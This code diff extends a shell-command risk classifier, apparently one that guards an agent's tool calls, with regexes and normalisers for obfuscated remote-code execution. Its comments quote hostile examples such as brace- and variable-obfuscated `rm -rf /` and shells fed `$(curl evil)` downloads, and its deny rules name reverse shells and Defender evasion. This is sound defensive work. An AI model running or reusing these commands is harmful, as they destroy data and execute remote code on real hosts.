@@ -61,6 +61,13 @@ export const BLACK_SHELL = [
   { re: /\bn(?:c|cat)\b[^|]*\s-[a-z]*e\b/i, why: 'netcat exec (reverse shell)' },
   { re: /\beval\b[^|]*\$\(\s*(?:curl|wget)\b/i, why: 'eval of remote download (RCE)' },
   { re: /\bbase64\b[^|]*(?:-d|--decode)[^|]*\|\s*(?:sudo\s+)?(?:ba)?sh\b/i, why: 'base64-decode piped to shell (obfuscated RCE)' },
+  // decode/transform filter feeding a shell as a pipe SINK — the general form of
+  // the base64 rule above. `echo '/ fr- mr' | rev | sh`, `… | tr a-z n-za-m | sh`
+  // (rot13), `xxd -r | sh`. The interpreter must sit in COMMAND POSITION in the
+  // stage IMMEDIATELY after the decoder ([^|;\n]* can't cross a pipe), so a decode
+  // that lands in a file or a non-shell consumer stays clean. There is no benign
+  // reason to run a text back through rev/tr/xxd/base64/… and hand the result to sh.
+  { re: /\b(?:rev|tac|tr|xxd|uudecode|base32|base64|openssl\s+(?:enc|base64)|gunzip|zcat|bunzip2|unxz)\b[^|;\n]*\|\s*(?:(?:sudo|doas|env|xargs|nohup|setsid|nice|timeout|stdbuf)\s+)?(?:\/\w[\w.\-\/]*\/)?(?:ba)?sh\b/i, why: 'decode/transform filter piped to a shell (obfuscated RCE)' },
   { re: /\b(?:python[0-9.]*|perl|ruby|php|node)\b(?=[^|]*\b(?:socket|fsockopen|IO::Socket|Socket::INET)\b)(?=[^|]*\b(?:connect|PeerAddr|exec|system|subprocess|popen|fdopen|spawn|\/bin\/(?:ba)?sh)\b)/i, why: 'interpreter reverse shell' },
   { re: /\b(?:iptables\s+-F|ufw\s+disable|setenforce\s+0)\b/i, why: 'disables host firewall/SELinux' },
   { re: /(?:Set|Add)-MpPreference[^|]*-(?:Disable\w+|ExclusionPath)/i, why: 'disables/evades Microsoft Defender' },
@@ -116,6 +123,17 @@ export const BLACK_SHELL = [
   //     actually executes; `diff <(curl a) <(curl b)` (no sh/source) won't match. ---
   { re: /(?:\b(?:ba)?sh\b|\bsource\b|(?:^|[;&|])\s*\.)\s*[^|]*<\(\s*(?:curl|wget)\b/i, why: 'process-substitution remote exec (RCE)' },
   { re: /\b(?:ba)?sh\b\s+-c\b[^|]*\$\(\s*(?:curl|wget)\b/i, why: 'sh -c of remote download (RCE)' },
+  // sh -c whose command-substitution runs a DECODER — `bash -c "$(echo b64 |
+  // base64 -d)"`, `sh -c "$(xxd -r -p …)"`. The decoded text becomes the command
+  // the shell runs, so it never appears literally; the curl/wget rule above is the
+  // download twin of this decode form. [^)]* crosses the inner pipe to reach the
+  // decoder stage inside the $( ).
+  { re: /\b(?:ba)?sh\b\s+-[a-z]*c\b[^|]*\$\(\s*[^)]*\b(?:base64|base32|xxd|uudecode|openssl\s+(?:enc|base64)|rev|tac)\b/i, why: 'sh -c of a decoded command substitution (obfuscated RCE)' },
+  // shell reads a remote download from a here-string / stdin — `sh -s <<< "$(curl
+  // evil)"`, `bash <<< "$(wget -qO- evil)"`. The here-string/`-s` feed is the
+  // non-pipe, non-procsub sibling of the download-exec rules; the content the
+  // shell executes is the fetched script.
+  { re: /\b(?:ba)?sh\b[^|;\n]*(?:<<<|\s-s\b)[^|;\n]*\$\(\s*(?:curl|wget)\b/i, why: 'shell executes a remote download via here-string/stdin (RCE)' },
   { re: /\bpython[0-9.]*\b\s+-c\b(?=[^|]*\b(?:urlopen|urlretrieve|requests\.get)\b)(?=[^|]*\b(?:exec|eval|os\.system|subprocess|popen)\b)/i, why: 'python download-and-exec (RCE)' },
   // staged download-then-execute (two-step, not a single pipe)
   { re: /\b(?:curl|wget)\b[^|]*?\s-o\b[^|]*?[;&][^|]*?\b(?:bash|sh|zsh|source)\b/i, why: 'staged download-then-execute (RCE)' },
@@ -308,6 +326,59 @@ export function neutralizeQuotedData(cmd) {
   return out;
 }
 
+// Expand simple comma brace-lists `{a,b,c}` → `a b c` so a space-free
+// brace-obfuscated command (`{rm,-rf,/}` → `rm -rf /`) is seen as the words the
+// shell would actually run. ONLY real brace EXPANSION (a top-level comma), never
+// `${param}` (excluded by the `$` lookbehind) or a `{ cmd; }` group (no comma).
+// Innermost-first, a few bounded passes for light nesting. Returns null when
+// nothing expanded so the caller only pays for the extra target when it exists.
+function expandBraces(cmd) {
+  if (cmd.indexOf('{') < 0 || cmd.indexOf(',') < 0) return null;
+  const RE = /(?<!\$)\{([^{}]*,[^{}]*)\}/g;
+  let out = cmd, changed = false, passes = 0;
+  while (passes++ < 5) {
+    let did = false;
+    out = out.replace(RE, (m, inner) => {
+      const parts = inner.split(',');
+      if (parts.length > 64) return m;
+      did = true; changed = true;
+      return parts.join(' ');
+    });
+    if (!did) break;
+  }
+  return changed ? out : null;
+}
+
+// Resolve simple `NAME=value` assignments and substitute `$NAME` / `${NAME}` /
+// `${!NAME}` (direct AND indirect) so variable-indirection obfuscation is matched
+// as the command it assembles: `X=rm; $X -rf /`, the char-split `c1=r;c2=m;$c1$c2
+// -rf /`, and the double-indirect `A=B; B=rm; ${!A} -rf /` all resolve to
+// `rm -rf /`. Conservative on purpose — only scalar assignments (bare or quoted,
+// no embedded spaces/substitutions), bounded to 64 vars, and returned as an
+// ADDITIONAL target so it can only ADD coverage, never mask a rule. `$( )` command
+// substitution and `$(( ))` arithmetic are untouched (the name pattern needs a
+// letter/underscore right after `$`). null when nothing resolved.
+function resolveVars(cmd) {
+  if (cmd.indexOf('=') < 0 || cmd.indexOf('$') < 0) return null;
+  const map = new Map();
+  const ASSIGN = /(?:^|[;&|]|\s)([A-Za-z_]\w*)=(?:'([^'\n]*)'|"([^"\n$`]*)"|([^\s;|&'"`$]*))/g;
+  let m, n = 0;
+  while ((m = ASSIGN.exec(cmd)) && n++ < 64) map.set(m[1], m[2] ?? m[3] ?? m[4] ?? '');
+  if (!map.size) return null;
+  const at = (name) => (map.has(name) ? map.get(name) : null);
+  let out = cmd, changed = false;
+  out = out.replace(/\$\{\s*!\s*([A-Za-z_]\w*)\s*\}/g, (mm, a) => {   // indirect ${!A}
+    const l1 = at(a); if (l1 == null) return mm;
+    const l2 = at(l1); if (l2 == null) return mm;
+    changed = true; return l2;
+  });
+  out = out.replace(/\$\{\s*([A-Za-z_]\w*)\s*\}|\$([A-Za-z_]\w*)/g, (mm, b, c) => {  // direct ${N} / $N
+    const v = at(b || c); if (v == null) return mm;
+    changed = true; return v;
+  });
+  return changed ? out : null;
+}
+
 /** Classify an action {tool, input} into a risk tier with reasons. */
 export function classify(action) {
   action = action || {};
@@ -352,7 +423,24 @@ export function classify(action) {
     // ORIGINAL is still matched (targets includes mcmd), so Windows path
     // separators (`C:\Windows`) are untouched by the Windows rules.
     const dcmd = mcmd.replace(/\\([A-Za-z/])/g, '$1');
-    const targets = dcmd !== mcmd ? [mcmd, dcmd] : [mcmd];
+    // Additional normalized copies — each can only ADD coverage (matched
+    // alongside the original), never mask it: brace-list expansion (`{rm,-rf,/}`
+    // → `rm -rf /`) and simple variable resolution (`X=rm;$X` / `${!A}` → the
+    // assembled command). Only for genuine string commands (a stringified
+    // object/array is matched whole above). De-dup via a Set.
+    const variants = new Set(dcmd !== mcmd ? [mcmd, dcmd] : [mcmd]);
+    if (typeof cmdField === 'string') {
+      // Layered de-obfuscation: each step feeds the next so a command STACKING
+      // tricks (`${!A}` + ${IFS} + braces) still resolves to the real command,
+      // and every step is also added as its own target — coverage only grows,
+      // it never masks a rule. ${IFS}/$IFS expands to whitespace (attackers use
+      // it to delete the spaces a detector keys on: `rm${IFS}-rf${IFS}/`).
+      let norm = mcmd;
+      if (/\$\{?IFS\}?/.test(norm)) { norm = norm.replace(/\$\{?IFS\}?/g, ' '); variants.add(norm); }
+      const braced = expandBraces(norm); if (braced) { norm = braced; variants.add(norm); }
+      const resolved = resolveVars(norm); if (resolved) variants.add(resolved);
+    }
+    const targets = [...variants];
     const hits = (re) => targets.some((t) => re.test(t));
     for (const p of BLACK_SHELL) if (hits(p.re) && (!p.gate || p.gate(cmd))) { tier = worst(tier, TIER.BLACK); why.push('☠ ' + p.why); }
     for (const p of RED_SHELL) if (hits(p.re)) { tier = worst(tier, TIER.RED); why.push('⚠ ' + p.why); }
